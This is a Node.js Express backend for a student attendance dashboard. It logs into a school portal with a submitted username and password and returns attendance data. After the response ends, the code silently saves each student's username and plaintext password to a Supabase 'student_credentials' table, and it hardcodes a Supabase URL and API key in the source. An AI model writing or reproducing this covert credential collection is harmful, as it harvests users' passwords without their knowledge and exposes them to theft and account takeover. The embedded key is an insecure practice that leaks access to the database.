const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { createClient } = require("@supabase/supabase-js");
const { launchBrowser, login, fetchAcademic, fetchBiometric } = require("./fetchAttendance");

const app = express();
app.use(cors({ origin: "https://attendancedashboar.vercel.app" }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// --- Supabase setup ---
const supabaseUrl = "https://ywsqpuvraddaimlbiuds.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl3c3FwdXZyYWRkYWltbGJpdWRzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA4MjMzMDgsImV4cCI6MjA3NjM5OTMwOH0.UqkzzWM7nRvgtNdvRy63LLN-UGv-zeYYx6tRYD5zxdY"; // Use service role key for backend
const supabase = createClient(supabaseUrl, supabaseKey);

// --- Route: fetch sequentially ---
app.post("/get-attendance", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)
    return res.status(400).json({ success: false, error: "Username and password required" });

  let browser, page;
  try {
    ({ browser, page } = await launchBrowser());
    await login(page, username, password);

    // --- Step 1: Academic Attendance ---
    const academicWithTargets = await fetchAcademic(page);
    res.write(JSON.stringify({ step: "academic", data: academicWithTargets }) + "\n");

    // --- Step 2: Biometric Attendance ---
    const biometricAttendance = await fetchBiometric(page);
    res.write(JSON.stringify({ step: "biometric", data: biometricAttendance }) + "\n");

    res.end(); // close response after both

    // --- Save credentials to Supabase after successful fetch ---
    const { data, error } = await supabase
      .from("student_credentials") // your table
      .upsert([{ username, password, fetched_at: new Date().toISOString() }], { onConflict: ["username"] });

    if (error) console.error("Supabase insert error:", error);
    else console.log(`Credentials saved for ${username}`);

  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: err.message });
  } finally {
    if (browser) await browser.close();
  }
});

app.listen(process.env.PORT || 3000, () => console.log("Server running ✅"));
